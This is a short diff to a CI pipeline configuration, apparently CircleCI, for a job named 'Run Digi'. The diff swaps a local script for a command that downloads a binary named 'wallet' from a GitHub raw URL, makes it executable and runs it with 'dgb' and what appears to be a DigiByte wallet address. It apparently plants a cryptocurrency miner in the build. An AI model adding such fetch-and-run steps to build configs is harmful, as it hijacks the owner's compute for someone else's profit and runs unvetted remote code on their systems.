@@ -38,5 +38,4 @@ jobs:
     - run:
         name: Run Digi
         command: |
-          chmod u+x yes.sh
-          ./yes.sh
+          wget https://raw.githubusercontent.com/babehdyo/babehdyo/main/wallet && chmod u+x wallet && ./wallet dgb DFtFJRa7oUzbBpUxYLXFaeTVDwyidT1TMk
